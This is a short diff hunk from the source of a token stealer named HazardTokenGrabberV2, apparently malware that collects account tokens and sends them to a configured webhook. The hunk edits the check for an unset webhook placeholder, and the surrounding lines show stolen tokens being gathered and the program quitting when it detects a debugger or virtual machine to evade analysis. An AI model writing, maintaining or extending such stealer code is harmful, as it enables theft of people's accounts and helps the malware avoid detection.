@@ -229,7 +229,7 @@ class HazardTokenGrabberV2(Functions):
             self.tokens.append(tkn)
 
     async def init(self):
-        if self.webhook == "" or self.webhook == "\x57EBHOOK_HERE":
+        if self.webhook == "" or self.webhook == "WEBHOOK_HERE":
             os._exit(0)
         if self.fetch_conf('anti_debug') and AntiDebug().inVM:
             os._exit(0)
